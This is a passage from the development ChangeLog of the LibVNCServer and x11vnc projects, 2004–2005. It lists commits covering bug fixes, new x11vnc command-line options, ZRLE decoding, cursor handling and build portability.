	x11vnc/tkx11vnc.h, x11vnc/x11vnc.1, x11vnc/x11vnc.c:  x11vnc: -grab_buster for XGrabServer deadlock; fix scrolls and
	 copyrect for -clip and -id

2005-07-07  runge <runge>

	* ChangeLog, x11vnc/ChangeLog, x11vnc/README, x11vnc/tkx11vnc,
	x11vnc/tkx11vnc.h, x11vnc/x11vnc.1, x11vnc/x11vnc.c:  x11vnc: -gui tray now embeds in systray; more improvements to gui.

2005-07-02  runge <runge>

	* ChangeLog, libvncserver/httpd.c, x11vnc/ChangeLog, x11vnc/README,
	x11vnc/tkx11vnc, x11vnc/tkx11vnc.h, x11vnc/x11vnc.1,
	x11vnc/x11vnc.c:  x11vnc: -gui tray mode, httpd.c: check httpListenSock >= 0.

2005-06-28  dscho <dscho>

	* ChangeLog, TODO, libvncclient/zrle.c: fix annoying zrle decoding
	bug

2005-06-27  runge <runge>

	* ChangeLog, libvncserver/main.c:  main.c: fix screen->deferUpdateTime default.

2005-06-27  runge <runge>

	* x11vnc/ChangeLog, x11vnc/README, x11vnc/tkx11vnc,
	x11vnc/tkx11vnc.h, x11vnc/x11vnc.1, x11vnc/x11vnc.c:  x11vnc: track keycode state for heuristics, -sloppy_keys, -wmdt,
	 add -nodbg as option

2005-06-21  dscho <dscho>

	* TODO: ZRLE has problems with RealVNC server. Look into it.

2005-06-21  runge <runge>

	* x11vnc/ChangeLog, x11vnc/README, x11vnc/x11vnc.1, x11vnc/x11vnc.c:  x11vnc: long info and tips when XOpenDisplay fails, reinstate "bad
	 desktop" for wireframe

2005-06-18  runge <runge>

	* ChangeLog, configure.ac, x11vnc/ChangeLog, x11vnc/README,
	x11vnc/x11vnc.1, x11vnc/x11vnc.c:  configure.ac: HP-UX and OSF1 no -R, x11vnc: second round of
	 beta-testing fixes.

2005-06-14  runge <runge>

	* ChangeLog, configure.ac, libvncserver/cursor.c, x11vnc/ChangeLog,
	x11vnc/README, x11vnc/tkx11vnc, x11vnc/tkx11vnc.h, x11vnc/x11vnc.1,
	x11vnc/x11vnc.c:  main.c: XReadScreen check, fix 64bit use of cursors, x11vnc: first
	 round of beta-testing fixes, RFE's.

2005-06-11  dscho <dscho>

	* ChangeLog, configure.ac: no longer complain on Solaris about
	missing ar, which was not really missing

2005-06-06  dscho <dscho>

	* rfb/rfbproto.h: add definitions from other VNC implementations

2005-06-06  dscho <dscho>

	* TODO: more TODOs

2005-06-06  dscho <dscho>

	* client_examples/Makefile.am, configure.ac: link to libmp3lame only
	if exists

2005-06-04  runge <runge>

	* ChangeLog, libvncserver/main.c, x11vnc/ChangeLog, x11vnc/README,
	x11vnc/tkx11vnc, x11vnc/tkx11vnc.h, x11vnc/x11vnc.1,
	x11vnc/x11vnc.c:  main.c: no sraRgnSubstract for copyRect, scrolls for x11vnc -scale;
	 add -fixscreen

2005-05-31  runge <runge>

	* ChangeLog, libvncserver/main.c, x11vnc/ChangeLog, x11vnc/README,
	x11vnc/x11vnc.1, x11vnc/x11vnc.c:  main.c: fix copyRect for non-cursor-shape-aware clients.

2005-05-25  dscho <dscho>

	* index.html: news

2005-05-25  runge <runge>

	* ChangeLog, prepare_x11vnc_dist.sh, x11vnc/ChangeLog,
	x11vnc/README, x11vnc/tkx11vnc, x11vnc/tkx11vnc.h, x11vnc/x11vnc.1,
	x11vnc/x11vnc.c:  x11vnc: scrolling: grabserver, autorepeat throttling, mouse wheel,
	 fix onetile

2005-05-24  dscho <dscho>

	* examples/.cvsignore: mac works!

2005-05-24  dscho <dscho>

	* Makefile.am, configure.ac: make libvncserver-conf executable the
	autoconf way

2005-05-24  dscho <dscho>

	* Makefile.am: "make t" now executes the tests

2005-05-24  dscho <dscho>

	* libvncclient/Makefile.am: do distribute and depend on zrle.c

2005-05-24  dscho <dscho>

	* TODO, libvncclient/rfbproto.c, libvncclient/tight.c,
	libvncclient/vncviewer.c, libvncclient/zlib.c, libvncclient/zrle.c,
	test/encodingstest.c: implement ZRLE decoding

2005-05-24  dscho <dscho>

	* client_examples/SDLvncviewer.c: try 32 bit first

2005-05-24  dscho <dscho>

	* examples/example.c, libvncserver/font.c: fix off by one bug

2005-05-23  dscho <dscho>

	* libvncclient/tight.c, libvncclient/vncviewer.c: init a structure
	*before* using it...

2005-05-23  dscho <dscho>

	* libvncclient/tight.c: remove wrong comment

2005-05-23  dscho <dscho>

	* libvncclient/rfbproto.c, libvncclient/tight.c,
	libvncclient/vncviewer.c, libvncclient/zlib.c, rfb/rfbclient.h: make
	zlib and tight handling thread safe (static -> rfbClient)

2005-05-23  dscho <dscho>

	* client_examples/vnc2mpg.c: work around bug in ffmpeg

2005-05-23  dscho <dscho>

	* ChangeLog, configure.ac: simplify configure (do not check for
	malloc(0) bug)

2005-05-23  dscho <dscho>

	* client_examples/vnc2mpg.c: fix compilation for
	LIBAVCODEC_BUILD==4754

2005-05-20  dscho <dscho>

	* acinclude.m4: finally fix socklen_t problem

2005-05-18  dscho <dscho>

	* acinclude.m4: fix socklen_t also for defines

2005-05-18  dscho <dscho>

	* ChangeLog, acinclude.m4, rfb/rfb.h: fix compilation for systems
	without socklen_t

2005-05-18  dscho <dscho>

	* libvncserver/main.c: fix off by one bug

2005-05-18  dscho <dscho>

	* examples/vncev.c, libvncclient/listen.c, libvncclient/rfbproto.c,
	libvncclient/sockets.c, libvncclient/vncviewer.c,
	libvncserver/main.c, libvncserver/rfbserver.c,
	libvncserver/vncauth.c, rfb/rfb.h, test/copyrecttest.c,
	test/encodingstest.c, vncterm/VNCommand.c: hide strict ansi stuff if
	not explicitely turned on; actually use the socklen_t test from
	configure.ac

2005-05-18  runge <runge>

	* ChangeLog, x11vnc/ChangeLog, x11vnc/README, x11vnc/tkx11vnc,
	x11vnc/tkx11vnc.h, x11vnc/x11vnc.1, x11vnc/x11vnc.c:  x11vnc: more scrolling, -scr_term, -wait_ui, -nowait_bog

2005-05-17  dscho <dscho>

	* libvncserver/Makefile.am: also distribute private.h...

2005-05-17  dscho <dscho>

	* TODO: update TODOs

2005-05-16  dscho <dscho>

	* libvncserver/rfbserver.c: fix SIGSEGV when client has incompatible
	protocol; release mutex before freeing it

2005-05-15  dscho <dscho>

	* ChangeLog, VisualNaCro/configure.ac, VisualNaCro/default8x16.h,
	VisualNaCro/nacro.c, client_examples/SDLvncviewer.c,
	client_examples/ppmtest.c, contrib/zippy.c, examples/example.c,
	examples/fontsel.c, examples/pnmshow.c, examples/pnmshow24.c,
	examples/radon.h, examples/storepasswd.c, examples/vncev.c,
	libvncclient/listen.c, libvncclient/rfbproto.c,
	libvncclient/sockets.c, libvncclient/vncviewer.c,
	libvncserver/auth.c, libvncserver/cargs.c, libvncserver/corre.c,
	libvncserver/cursor.c, libvncserver/d3des.c, libvncserver/font.c,
	libvncserver/hextile.c, libvncserver/httpd.c, libvncserver/main.c,
	libvncserver/private.h, libvncserver/rfbregion.c,
	libvncserver/rfbserver.c, libvncserver/rre.c,
	libvncserver/selbox.c, libvncserver/sockets.c,
	libvncserver/tight.c, libvncserver/translate.c,
	libvncserver/vncauth.c, libvncserver/zlib.c, libvncserver/zrle.c,
	libvncserver/zrleencodetemplate.c, libvncserver/zrleoutstream.c,
	rfb/default8x16.h, rfb/rfb.h, rfb/rfbproto.h, test/copyrecttest.c,
	test/cursortest.c, test/encodingstest.c, vncterm/VNCommand.c,
	vncterm/VNConsole.c: ANSIfy, fix some warnings from Linus' sparse

2005-05-15  runge <runge>

	* libvncserver/main.c, libvncserver/rfbserver.c:  libvncserver/{main.c,rfbserver.c}: fix a couple more CopyRect
	 memory leaks

2005-05-14  dscho <dscho>

	* .cvsignore, examples/.cvsignore, test/.cvsignore,
	x11vnc/misc/.cvsignore: more files to ignore

2005-05-14  dscho <dscho>

	* ChangeLog, examples/example.c, libvncserver/main.c,
	libvncserver/rfbserver.c: fix memory leaks detected using valgrind

2005-05-14  runge <runge>

	* ChangeLog, x11vnc/ChangeLog, x11vnc/README, x11vnc/tkx11vnc,
	x11vnc/tkx11vnc.h, x11vnc/x11vnc.1, x11vnc/x11vnc.c:  x11vnc: more improvements to -scrollcopyrect and -xkb modes.

2005-05-07  dscho <dscho>

	* ChangeLog, VisualNaCro/nacro.c, VisualNaCro/nacro.h,
	examples/example.c, examples/fontsel.c, libvncserver/httpd.c,
	libvncserver/main.c, libvncserver/rfbserver.c,
	libvncserver/sockets.c, rfb/rfb.h, test/cursortest.c,
	vncterm/LinuxVNC.c, vncterm/VNConsole.c, x11vnc/x11vnc.c: 
	socketInitDone -> socketState

2005-05-03  runge <runge>

	* ChangeLog, configure.ac, libvncserver/main.c:  libvncserver/main.c: fix memory leak in
	 rfbDoCopyRect/rfbScheduleCopyRect; configure.ac tweaks.

2005-05-03  runge <runge>

	* ChangeLog, configure.ac, x11vnc/ChangeLog, x11vnc/README,
	x11vnc/tkx11vnc, x11vnc/tkx11vnc.h, x11vnc/x11vnc.1,
	x11vnc/x11vnc.c:  x11vnc: -scrollcopyrect/RECORD, etc. configure.ac: customizations
	 for x11vnc pkg

2005-04-27  dscho <dscho>

	* ChangeLog, libvncserver/rfbserver.c: clear requested region after
	handling it

2005-04-19  runge <runge>

	* ChangeLog, x11vnc/ChangeLog, x11vnc/README, x11vnc/misc/README,
	x11vnc/tkx11vnc, x11vnc/tkx11vnc.h, x11vnc/x11vnc.1,
	x11vnc/x11vnc.c:  x11vnc: -wireframe, -wirecopyrect, -privremote, -safer, -nocmd,
	 -unsafe, -noviewonly

2005-04-12  runge <runge>

	* x11vnc/ChangeLog, x11vnc/misc/Makefile.am, x11vnc/misc/ranfb.pl:  x11vnc: add rawfb setup example misc/ranfb.pl

2005-04-11  runge <runge>

	* x11vnc/ChangeLog, x11vnc/README, x11vnc/misc/slide.pl,
	x11vnc/tkx11vnc, x11vnc/tkx11vnc.h, x11vnc/x11vnc.1,
	x11vnc/x11vnc.c:  x11vnc: fix some -rawfb bugs, add setup:cmd

2005-04-10  runge <runge>

	* ChangeLog, configure.ac, prepare_x11vnc_dist.sh,
	x11vnc/ChangeLog, x11vnc/Makefile.am, x11vnc/README,
	x11vnc/misc/Makefile.am, x11vnc/misc/README,
	x11vnc/misc/blockdpy.c, x11vnc/misc/dtVncPopup,
	x11vnc/misc/rx11vnc, x11vnc/misc/rx11vnc.pl, x11vnc/misc/shm_clear,
	x11vnc/misc/slide.pl, x11vnc/misc/vcinject.pl,
	x11vnc/misc/x11vnc_loop, x11vnc/tkx11vnc, x11vnc/tkx11vnc.h,
	x11vnc/x11vnc.1, x11vnc/x11vnc.c:  x11vnc: -rawfb, -pipeinput, -xtrap, -flag, ...

2005-04-04  runge <runge>

	* ChangeLog, configure.ac, x11vnc/ChangeLog, x11vnc/README,
	x11vnc/tkx11vnc, x11vnc/tkx11vnc.h, x11vnc/x11vnc.1,
	x11vnc/x11vnc.c:  x11vnc: use DEC-XTRAP on legacy X11R5, -shiftcmap, -http

2005-03-29  runge <runge>

	* ChangeLog, x11vnc/ChangeLog, x11vnc/README, x11vnc/tkx11vnc,
	x11vnc/tkx11vnc.h, x11vnc/x11vnc.1, x11vnc/x11vnc.c:  x11vnc: fix event leaks, build-time customizations, -nolookup

2005-03-20  runge <runge>

	* ChangeLog, x11vnc/ChangeLog, x11vnc/README, x11vnc/tkx11vnc,
	x11vnc/tkx11vnc.h, x11vnc/x11vnc.1, x11vnc/x11vnc.c:  x11vnc: scale cursors, speed up some scaling, alt arrows, -norepeat
	 N

2005-03-12  runge <runge>

	* ChangeLog, x11vnc/ChangeLog, x11vnc/README, x11vnc/tkx11vnc,
	x11vnc/tkx11vnc.h, x11vnc/x11vnc.1, x11vnc/x11vnc.c:  x11vnc: X DAMAGE support, -clip WxH+X+Y, identd.

2005-03-09  dscho <dscho>

	* test/encodingstest.c: fix compilation when no libz is available

2005-03-07  dscho <dscho>

	* configure.ac, rfb/rfbproto.h: do the in_addr_t stuff correctly...

2005-03-07  dscho <dscho>

	* configure.ac: check for in_addr_t

2005-03-06  dscho <dscho>

	* client_examples/SDLvncviewer.c: fix for older SDL versions

2005-03-05  runge <runge>

	* ChangeLog, Makefile.am, configure.ac, libvncserver/Makefile.am:  autoconf: rpm -> rpmbuild and echo -n -> printf

2005-03-05  runge <runge>

	* ChangeLog, libvncclient/sockets.c, libvncserver/cargs.c,
	libvncserver/httpd.c, libvncserver/main.c, libvncserver/sockets.c,
	rfb/rfb.h, x11vnc/ChangeLog, x11vnc/README, x11vnc/tkx11vnc,
	x11vnc/tkx11vnc.h, x11vnc/x11vnc.1, x11vnc/x11vnc.c:  add '-listen ipaddr' option

2005-03-01  dscho <dscho>

	* client_examples/ppmtest.c: do not crash when /tmp is not writable

2005-02-23  runge <runge>

	* x11vnc/ChangeLog, x11vnc/README, x11vnc/x11vnc.1, x11vnc/x11vnc.c:  x11vnc: final changes for 0.7.1 release.

2005-02-22  runge <runge>

	* x11vnc/ChangeLog, x11vnc/README, x11vnc/tkx11vnc,
	x11vnc/tkx11vnc.h, x11vnc/x11vnc.1, x11vnc/x11vnc.c:  x11vnc: -nap is now the default, version str 0.7.1.

2005-02-14  runge <runge>

	* ChangeLog, x11vnc/ChangeLog, x11vnc/README, x11vnc/tkx11vnc,
	x11vnc/tkx11vnc.h, x11vnc/x11vnc.1, x11vnc/x11vnc.c:  x11vnc: -users lurk=, -solid for cde, -gui ez,.. beginner mode.

2005-02-11  runge <runge>

	* ChangeLog, x11vnc/ChangeLog, x11vnc/README, x11vnc/tkx11vnc,
	x11vnc/tkx11vnc.h, x11vnc/x11vnc.1, x11vnc/x11vnc.c:  x11vnc -input to fine tune allow user input.  per-client settings
	 -R

2005-02-09  runge <runge>

	* ChangeLog, configure.ac, x11vnc/ChangeLog, x11vnc/README,
	x11vnc/tkx11vnc, x11vnc/tkx11vnc.h, x11vnc/x11vnc.1,
	x11vnc/x11vnc.c:  x11vnc -users, fix -solid on gnome/kde, configure.ac pwd.h wait.h
	 and utmpx.h

2005-02-07  runge <runge>

	* ChangeLog, prepare_x11vnc_dist.sh:  prepare_x11vnc_dist.sh: few tweaks for next release

2005-02-07  runge <runge>

	* ChangeLog, configure.ac:  configure.ac: --with-jpeg=DIR --with-zlib=DIR, /usr/sfw

2005-02-05  runge <runge>

	* ChangeLog, tightvnc-1.3dev5-vncviewer-alpha-cursor.patch,
	x11vnc/ChangeLog, x11vnc/README, x11vnc/tkx11vnc,
	x11vnc/tkx11vnc.h, x11vnc/x11vnc.1, x11vnc/x11vnc.c:  x11vnc -solid color, -opts; tightvnc unix viewer alpha patch

2005-01-25  dscho <dscho>

	* TODO, libvncserver/rfbserver.c: 10l: really fix preferredEncoding
	set from outside

2005-01-24  runge <runge>

	* x11vnc/x11vnc.c:  whoops, test version of x11vnc.c leaked out...

2005-01-24  runge <runge>

	* ChangeLog, x11vnc/ChangeLog, x11vnc/README, x11vnc/tkx11vnc,
	x11vnc/tkx11vnc.h, x11vnc/x11vnc.1, x11vnc/x11vnc.c:  sync with new cursor mechanism, -timeout, -noalphablend, try :0 if
	 no other info

2005-01-23  dscho <dscho>

	* test/cursortest.c: test Floyd-Steinberg dither for alpha masks

2005-01-21  dscho <dscho>

	* TODO, libvncserver/cursor.c, rfb/rfb.h: implemented
	Floyd-Steinberg dither in order to rfbMakeMaskFromAlphaSource

2005-01-21  dscho <dscho>

	* VisualNaCro/recorder.pl: use Getopt

2005-01-21  dscho <dscho>

	* libvncclient/vncviewer.c: if no argc & argv are passed, honour the
	serverHost&serverPort which was set by the application

2005-01-20  dscho <dscho>

	* test/cursortest.c: no need to strdup for MakeXCursor

2005-01-20  dscho <dscho>

	* ChangeLog, libvncserver/cursor.c: disappearing cursor fixed &
	debug message purged

2005-01-20  dscho <dscho>

	* libvncserver/cursor.c, libvncserver/main.c,
	libvncserver/rfbserver.c: fix disappearing cursor

2005-01-19  dscho <dscho>

	* libvncserver/cursor.c: redraw region under old cursor even if the
	old cursor doesn't have to be freed.

2005-01-19  dscho <dscho>

	* TODO: a granted wish has several children ;-)

2005-01-19  dscho <dscho>

	* test/encodingstest.c: fix test (don't show cursor...); correctly
	set the encodings in the client; really test 20 seconds

2005-01-19  dscho <dscho>

	* libvncserver/cursor.c: oops, a debug message slipped through

2005-01-18  dscho <dscho>

	* ChangeLog, contrib/zippy.c, examples/example.c,
	libvncserver/cursor.c, libvncserver/main.c,
	libvncserver/rfbserver.c, libvncserver/selbox.c, rfb/rfb.h,
	vncterm/VNConsole.c, x11vnc/x11vnc.c: pointerClient was still
	static.  do not make requestedRegion empty without reason.  the cursor handling for clients which don't handle CursorShape
	updates was completely broken. It originally was very complicated
	for performance reasons, however, in most cases it made performance
	even worse, because at idle times there was way too much checking
	going on, and furthermore, sometimes unnecessary updates were
	inevitable.  The code now is much more elegant: the ClientRec structure knows
	exactly where it last painted the cursor, and the ScreenInfo
	structure knows where the cursor shall be.  As a consequence there is no more rfbDrawCursor()/rfbUndrawCursor(),
	no more dontSendFramebufferUpdate, and no more isCursorDrawn.  It is
	now possible to have clients which understand CursorShape updates
	and clients which don't at the same time.  rfbSetCursor no longer has the option freeOld; this is obsolete, as
	the cursor structure knows what to free and what not.

2005-01-18  dscho <dscho>

	* libvncserver/rfbregion.c, rfb/rfbregion.h: add convenience
	function to clip using x2,y2 instead of w,h

2005-01-18  dscho <dscho>

	* test/Makefile.am, test/cursortest.c: add a cursor test
	(interactive for now)

2005-01-18  dscho <dscho>

	* VisualNaCro/.cvsignore: more ignorance

2005-01-17  dscho <dscho>

	* index.html: LibVNCClient is included

2005-01-17  dscho <dscho>

	* index.html: alpha cursor and VisualNaCro news

2005-01-16  dscho <dscho>

	* VisualNaCro/.cvsignore: ignore generated files

2005-01-16  runge <runge>

	* ChangeLog, libvncserver/cursor.c, rfb/rfb.h, x11vnc/ChangeLog,
	x11vnc/README, x11vnc/tkx11vnc, x11vnc/tkx11vnc.h, x11vnc/x11vnc.1,
	x11vnc/x11vnc.c:  add cursor alphablending to rfb.h cursor.c, x11vnc -alphablend
	 -snapfb etc..

2005-01-14  dscho <dscho>

	* VisualNaCro/Makefile.am, VisualNaCro/default8x16.h,
	VisualNaCro/nacro.c, VisualNaCro/nacro.h, VisualNaCro/recorder.pl: 
	fix most TODOs; recorder.pl now actually records something; add
	nacro.pm to package

2005-01-14  dscho <dscho>

	* examples/example.c: reverted segfault fix; use rfbDrawCharWithClip

2005-01-14  dscho <dscho>

	* libvncserver/font.c: add comment "if col=bcol, assume background
	is transparent"

2005-01-14  dscho <dscho>

	* libvncserver/main.c: fix comment

2005-01-14  dscho <dscho>

	* libvncserver/rfbserver.c: close socket in ClientConnectionGone

2005-01-14  dscho <dscho>

	* configure.ac: new version...

2005-01-14  dscho <dscho>

	* VisualNaCro/AUTHORS, VisualNaCro/ChangeLog,
	VisualNaCro/Makefile.am, VisualNaCro/NEWS, VisualNaCro/README,
	VisualNaCro/autogen.sh, VisualNaCro/configure.ac,
	VisualNaCro/nacro.c, VisualNaCro/nacro.h, VisualNaCro/recorder.pl: 
	VisualNacro, a visual macro recorder for VNC. Alpha version

2005-01-14  dscho <dscho>

	* libvncserver/main.c, rfb/rfb.h: return value of rfbProcessEvents
	tells if an update was pending

2005-01-14  dscho <dscho>

	* libvncserver/font.c: fix segfault when trying to write outside of
	frameBuffer

2005-01-14  dscho <dscho>

	* libvncclient/vncviewer.c: argc and argv may be zero (which means
	to ignore them)

2005-01-03  dscho <dscho>

	* libvncserver/main.c, libvncserver/rfbserver.c, rfb/rfb.h: add hook
	to allow for custom client messages

2004-12-27  runge <runge>

	* ChangeLog, x11vnc/ChangeLog, x11vnc/README, x11vnc/tkx11vnc,
	x11vnc/tkx11vnc.h, x11vnc/x11vnc.1, x11vnc/x11vnc.c:  x11vnc: improve XFIXES cursor transparency, more remote-control
	 cmds.

2004-12-23  runge <runge>

	* x11vnc/README, x11vnc/x11vnc.1, x11vnc/x11vnc.c:  x11vnc: need tkx11vnc and tkx11vnc.h in x11vnc package

2004-12-23  runge <runge>

	* x11vnc/Makefile.am:  x11vnc: need tkx11vnc and tkx11vnc.h in x11vnc package

2004-12-23  runge <runge>

	* x11vnc/Makefile.am:  x11vnc: need tkx11vnc and tkx11vnc.h in x11vnc package

2004-12-23  runge <runge>

	* prepare_x11vnc_dist.sh, x11vnc/ChangeLog, x11vnc/README,
	x11vnc/tkx11vnc, x11vnc/tkx11vnc.h, x11vnc/x11vnc.1,
	x11vnc/x11vnc.c:  x11vnc: minor tweaks for x11vnc 0.7 file release

2004-12-20  dscho <dscho>

	* index.html: Ooh, I'm lazy. Some news were added retroactively.

2004-12-20  dscho <dscho>

	* ChangeLog, configure.ac, index.html: released 0.7

2004-12-20  dscho <dscho>

	* examples/mac.c: compile fix on mac; still untested...

2004-12-20  dscho <dscho>

	* test/Makefile.am: fix for MinGW

2004-12-20  runge <runge>

	* x11vnc/README, x11vnc/tkx11vnc, x11vnc/tkx11vnc.h,
	x11vnc/x11vnc.1, x11vnc/x11vnc.c:  x11vnc: minor tweaks for 0.7 file release

2004-12-20  runge <runge>

	* ChangeLog, libvncserver/cursor.c, x11vnc/ChangeLog,
	x11vnc/README, x11vnc/tkx11vnc, x11vnc/tkx11vnc.h, x11vnc/x11vnc.1,
	x11vnc/x11vnc.c:  x11vnc: synchronous mode for -remote, string cleanup

2004-12-17  dscho <dscho>

	* libvncserver/cursor.c: don't mix up width & height!

2004-12-17  runge <runge>

	* ChangeLog, test/encodingstest.c, x11vnc/ChangeLog, x11vnc/README,
	x11vnc/tkx11vnc, x11vnc/tkx11vnc.h, x11vnc/x11vnc.1,
	x11vnc/x11vnc.c:  x11vnc: XFIXES cursorshape, XRANDR resize, remote control, gui

2004-12-01  dscho <dscho>

	* rfb/rfb.h: fix compilation on non MinGW32...

2004-12-01  dscho <dscho>

	* ChangeLog, TODO, client_examples/Makefile.am,
	client_examples/SDLvncviewer.c, configure.ac, contrib/Makefile.am,
	examples/Makefile.am, examples/vncev.c, libvncclient/listen.c,
	libvncclient/rfbproto.c, libvncclient/sockets.c,
	libvncclient/vncviewer.c, libvncserver-config.in,
	libvncserver/httpd.c, libvncserver/main.c, libvncserver/sockets.c,
	rfb/rfb.h, rfb/rfbproto.h, test/Makefile.am, vncterm/Makefile.am,
	x11vnc/Makefile.am: support MinGW32!

2004-12-01  dscho <dscho>

	* AUTHORS, libvncclient/listen.c, libvncclient/sockets.c,
	libvncclient/vncviewer.c: use rfbClientErr to log errors, check if
	calloc succeded (both hinted by Andre Leiradella)

2004-11-30  dscho <dscho>

	* ChangeLog, libvncclient/sockets.c: fix long reads (in some events
	of success, no TRUE was returned)

2004-11-30  dscho <dscho>

	* rfb/rfbproto.h: add EncodingUltra; it is not implemented in the
	libraries yet, so this is just a place holder

2004-10-16  dscho <dscho>

	* TODO: TODOs from encodingstest

2004-10-16  dscho <dscho>

	* test/.cvsignore: tight-1 -> encodingstest

2004-10-16  dscho <dscho>

	* test/Makefile.am, test/{tight-1.c => encodingstest.c}: rename
	tight-1.c into encodingstest.c, fixing it in the process. It now
	passes all encodings except corre (broken) and zrle (not yet
	implemented in libvncclient)

2004-10-16  dscho <dscho>

	* libvncclient/rfbproto.c, libvncclient/sockets.c,
	libvncclient/tight.c, libvncclient/vncviewer.c,
	libvncclient/zlib.c, rfb/rfbclient.h: move read buffer to rfbClient
	structure (thread safety); make rfbClientLog overrideable

2004-10-15  dscho <dscho>

	* test/tight-1.c: compiles, 1st run is okay, 2nd and subsequent give
	errors. Evidently, libvncclient is not yet reentrant (or
	threadsafe).

2004-10-15  dscho <dscho>

	* libvncclient/vncviewer.c: no need to modify argv

2004-10-15  dscho <dscho>

	* TODO: ideas

2004-10-15  dscho <dscho>

	* test/tight-1.c: compiling, non functional version of a unit test
	for encodings

2004-10-04  dscho <dscho>

	* TODO: cursor problem

2004-10-02  dscho <dscho>

	* libvncserver/rfbserver.c: release client list mutex earlier

2004-09-14  dscho <dscho>

	* index.html, success.html: added success stories and link to
	x11vnc's home

2004-09-14  dscho <dscho>

	* success.html: add success stories (only one at the moment)

2004-09-07  dscho <dscho>

	* index.html: new API

2004-09-03  dscho <dscho>

	* libvncserver/rfbregion.c: output only via rfbErr

2004-09-03  dscho <dscho>

	* libvncserver-config.in: libvncserver.a is in libvncserver/ now

2004-09-01  runge <runge>

	* ChangeLog, prepare_x11vnc_dist.sh, x11vnc/ChangeLog,
	x11vnc/README, x11vnc/x11vnc.1, x11vnc/x11vnc.c:  x11vnc: new pointer input handling algorithm; x11vnc pkg installs
	 java viewer

2004-08-30  dscho <dscho>

	* ChangeLog: API changes

2004-08-30  dscho <dscho>

	* contrib/zippy.c, examples/colourmaptest.c, examples/example.c,
	examples/pnmshow.c, examples/pnmshow24.c, examples/storepasswd.c,
	examples/vncev.c, libvncclient/rfbproto.c, libvncserver/auth.c,
	libvncserver/cargs.c, libvncserver/corre.c, libvncserver/cursor.c,
	libvncserver/d3des.c, libvncserver/d3des.h, libvncserver/font.c,
	libvncserver/hextile.c, libvncserver/httpd.c, libvncserver/main.c,
	libvncserver/rfbserver.c, libvncserver/rre.c,
	libvncserver/selbox.c, libvncserver/sockets.c,
	libvncserver/stats.c, libvncserver/tight.c,
	libvncserver/translate.c, libvncserver/vncauth.c,
	libvncserver/zlib.c, libvncserver/zrle.c, rfb/rfb.h,
	rfb/rfbproto.h, test/cargstest.c, test/copyrecttest.c,
	vncterm/LinuxVNC.c, vncterm/VNConsole.c, vncterm/VNConsole.h,
	x11vnc/x11vnc.c: global structures/functions should have "rfb",
	"sra" or "zrle" as prefix, while structure members should not

2004-08-30  dscho <dscho>

	* client_examples/Makefile.am: my ffmpeg was compiled with
	mp3lame...

2004-08-30  runge <runge>

	* ChangeLog, configure.ac, x11vnc/ChangeLog, x11vnc/README,
	x11vnc/x11vnc.1, x11vnc/x11vnc.c:  x11vnc: -cursor change shape handling, configure.ac: add more
	 macros for X extensions

2004-08-17  dscho <dscho>

	* index.html: news: QEMU patch v6

2004-08-15  runge <runge>

	* ChangeLog, x11vnc/ChangeLog, x11vnc/README, x11vnc/x11vnc.1,
	x11vnc/x11vnc.c:  x11vnc: -overlay to fix colors with Sun 8+24 overlay visuals. -sid
	 option.

2004-08-04  runge <runge>

	* x11vnc/README, x11vnc/x11vnc.1:  fix XKBlib.h detection on *BSD, x11vnc: manpage and README

2004-08-04  runge <runge>

	* ChangeLog, configure.ac, prepare_x11vnc_dist.sh,
	x11vnc/ChangeLog, x11vnc/Makefile.am, x11vnc/x11vnc.c:  fix XKBlib.h detection on *BSD, x11vnc: manpage and README

2004-07-31  runge <runge>

	* x11vnc/ChangeLog, x11vnc/x11vnc.c:  x11vnc: adjust version number and output

2004-07-31  runge <runge>

	* ChangeLog, x11vnc/ChangeLog, x11vnc/x11vnc.c:  x11vnc: -cursorpos now the default, fix cursorpos + scaling bug.

2004-07-29  runge <runge>

	* ChangeLog, x11vnc/ChangeLog, x11vnc/x11vnc.c:  x11vnc: -add_keysyms dynamically add missing keysyms to X server

2004-07-27  runge <runge>

	* ChangeLog, x11vnc/ChangeLog, x11vnc/x11vnc.c:  x11vnc: -xkb (XKEYBOARD modtweak), -skip_keycodes, multi lines in
	 x11vncrc

2004-07-19  runge <runge>

	* x11vnc/ChangeLog, x11vnc/x11vnc.c:  x11vnc: ignore keysyms >4 for a keycode, add lastmod to -help,
	 -version

2004-07-16  runge <runge>

	* ChangeLog, configure.ac, x11vnc/ChangeLog, x11vnc/x11vnc.c:  modtweak is now the default for x11vnc; check X11/XKBlib.h in
	 configure.ac

2004-07-11  runge <runge>

	* ChangeLog, x11vnc/ChangeLog, x11vnc/x11vnc.c:  x11vnc: -norepeat to turn off X server autorepeat when clients
	 exist.

2004-07-05  runge <runge>

	* x11vnc/ChangeLog, x11vnc/x11vnc.c:  x11vnc: extend -allow to re-read a file with allowed IP addresses.

2004-07-02  runge <runge>

	* x11vnc/ChangeLog, x11vnc/x11vnc.c:  x11vnc: improve scaled grid calc to regain text compression. add
	 :pad option

2004-06-30  dscho <dscho>

	* libvncclient/vncviewer.c: do not use GNU-only getline

2004-06-28  runge <runge>

	* x11vnc/ChangeLog, x11vnc/x11vnc.c:  x11vnc: round scaled width to multiple of 4 to make vncviewer
	 happy.

2004-06-27  runge <runge>

	* x11vnc/ChangeLog, x11vnc/x11vnc.c:  x11vnc: speed up scaling a bit, add no blending option to -scale

2004-06-26  runge <runge>

	* ChangeLog, x11vnc/ChangeLog, x11vnc/x11vnc.c:  x11vnc: add "-scale fraction" for global server-side scaling.

2004-06-18  dscho <dscho>

	* libvncserver/zrleencodetemplate.c, test/tight-1.c,
	vncterm/LinuxVNC.c, vncterm/VNCommand.c, vncterm/VNConsole.c,
	vncterm/example.c: convert c++ comments to c comments

2004-06-18  dscho <dscho>

	* libvncserver/sockets.c: debug

2004-06-18  dscho <dscho>

	* client_examples/SDLvncviewer.c: cleanups; libvncclient supports
	-encodings already

2004-06-18  dscho <dscho>

	* client_examples/vnc2mpg.c: cleanups; support vncrec'orded files as
	input

2004-06-18  dscho <dscho>

	* examples/example.c, examples/pnmshow.c, examples/pnmshow24.c: now
	that the examples reside in a subdirectory, the classes path has to
	be adapted

2004-06-18  dscho <dscho>

	* rfb/rfbclient.h: more comments; support playing vncrec'orded files

2004-06-18  dscho <dscho>

	* libvncclient/rfbproto.c, libvncclient/sockets.c,
	libvncclient/vncviewer.c: support password reading with getpass();
	support -play to play vncrec'orded files

2004-06-17  runge <runge>

	* ChangeLog, x11vnc/ChangeLog, x11vnc/x11vnc.c:  x11vnc: simple ~/.x11vncrc config file support, -rc, -norc

2004-06-15  dscho <dscho>

	* TODO: fixed

2004-06-15  dscho <dscho>

	* libvncclient/hextile.c: fix silly hextile bug

2004-06-15  dscho <dscho>

